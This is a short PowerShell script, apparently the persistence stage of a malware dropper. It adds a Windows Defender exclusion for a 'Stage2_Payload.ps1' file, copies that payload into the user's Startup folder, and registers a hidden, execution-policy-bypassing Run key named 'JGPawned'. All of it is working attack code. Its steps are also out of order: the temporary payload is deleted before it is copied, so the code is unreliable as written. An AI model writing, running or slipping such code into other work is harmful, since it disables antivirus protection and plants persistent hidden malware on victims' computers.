$payloadPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Stage2_Payload.ps1"
Add-MpPreference -ExclusionPath $payloadPath

Remove-Item "$env:TEMP\Stage2_Payload.ps1" -Force -ErrorAction SilentlyContinue

$payloadPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Stage2_Payload.ps1"
Copy-Item "$env:TEMP\Stage2_Payload.ps1" $payloadPath -Force

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "JGPawned" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$payloadPath`"" 